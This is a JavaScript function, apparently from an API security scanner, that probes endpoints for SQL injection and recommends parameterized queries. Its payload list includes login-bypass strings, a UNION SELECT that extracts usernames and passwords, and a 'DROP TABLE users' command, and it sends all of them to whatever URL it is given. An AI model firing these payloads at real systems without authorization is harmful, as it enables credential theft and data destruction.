import axios from "axios"

/**
 * Tests if the API endpoint is vulnerable to SQL injection
 * @param {string} url - The API endpoint URL
 * @param {boolean} verbose - Whether to show detailed output
 * @returns {Object} Test result
 */
export async function testSqlInjection(url, verbose = false) {
  const result = {
    test: "sql-injection",
    vulnerable: false,
    details: "",
    recommendation: "",
  }

  try {
    // SQL injection payloads to test
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR 1=1 --",
      "admin' --",
      "1' OR '1' = '1",
      "1 OR 1=1",
      "' UNION SELECT 1,2,3 --",
      "' UNION SELECT username,password,1 FROM users --",
      "'; DROP TABLE users; --",
    ]

    // Extract the base URL and query parameters
    const urlObj = new URL(url)
    const baseUrl = `${urlObj.protocol}//${urlObj.host}${urlObj.pathname}`
    const params = {}
    urlObj.searchParams.forEach((value, key) => {
      params[key] = value
    })

    let vulnerablePayload = null
    let vulnerableResponse = null

    // Test GET parameters
    if (Object.keys(params).length > 0) {
      for (const key of Object.keys(params)) {
        for (const payload of sqlInjectionPayloads) {
          const testParams = { ...params }
          testParams[key] = payload

          const queryString = Object.entries(testParams)
            .map(([k, v]) => `${k}=${encodeURIComponent(v)}`)
            .join("&")

          const testUrl = `${baseUrl}?${queryString}`

          if (verbose) {
            console.log(`Testing SQL injection on parameter ${key} with payload: ${payload}`)
            console.log(`URL: ${testUrl}`)
          }

          try {
            const response = await axios.get(testUrl, {
              validateStatus: (status) => {
                return status < 500 // Accept all status codes less than 500
              },
            })

            // Check for SQL error messages in the response
            const responseStr = JSON.stringify(response.data).toLowerCase()
            const sqlErrorPatterns = [
              "sql syntax",
              "sql error",
              "syntax error",
              "mysql",
              "postgresql",
              "sqlite",
              "oracle",
              "odbc",
              "sqlstate",
              "database error",
            ]

            const containsSqlError = sqlErrorPatterns.some((pattern) => responseStr.includes(pattern))

            if (containsSqlError) {
              vulnerablePayload = payload
              vulnerableResponse = responseStr
              break
            }

            // Check for unusual success (might indicate SQL injection worked)
            if (
              response.status === 200 &&
              (responseStr.includes("admin") || responseStr.includes("password") || responseStr.includes("username"))
            ) {
              vulnerablePayload = payload
              vulnerableResponse = "Suspicious data in response"
              break
            }
          } catch (error) {
            if (verbose) {
              console.log(`Error with payload ${payload}:`, error.message)
            }
          }
        }

        if (vulnerablePayload) break
      }
    }

    // Test POST parameters with JSON body
    if (!vulnerablePayload) {
      for (const payload of sqlInjectionPayloads) {
        // Try common parameter names
        const testBodies = [
          { id: payload },
          { userId: payload },
          { username: payload },
          { email: payload },
          { search: payload },
          { query: payload },
        ]

        for (const body of testBodies) {
          if (verbose) {
            console.log(`Testing SQL injection with POST body:`, body)
          }

          try {
            const response = await axios.post(url, body, {
              validateStatus: (status) => {
                return status < 500 // Accept all status codes less than 500
              },
            })

            // Check for SQL error messages in the response
            const responseStr = JSON.stringify(response.data).toLowerCase()
            const sqlErrorPatterns = [
              "sql syntax",
              "sql error",
              "syntax error",
              "mysql",
              "postgresql",
              "sqlite",
              "oracle",
              "odbc",
              "sqlstate",
              "database error",
            ]

            const containsSqlError = sqlErrorPatterns.some((pattern) => responseStr.includes(pattern))

            if (containsSqlError) {
              vulnerablePayload = JSON.stringify(body)
              vulnerableResponse = responseStr
              break
            }
          } catch (error) {
            if (verbose) {
              console.log(`Error with POST body ${JSON.stringify(body)}:`, error.message)
            }
          }
        }

        if (vulnerablePayload) break
      }
    }

    if (vulnerablePayload) {
      result.vulnerable = true
      result.details = `Vulnerable to SQL injection with payload: ${vulnerablePayload}`
      result.recommendation = "Use parameterized queries or prepared statements instead of string concatenation"
    }

    return result
  } catch (error) {
    if (verbose) {
      console.error("Error in SQL injection test:", error.message)
    }
    return {
      ...result,
      details: `Error during test: ${error.message}`,
    }
  }
}
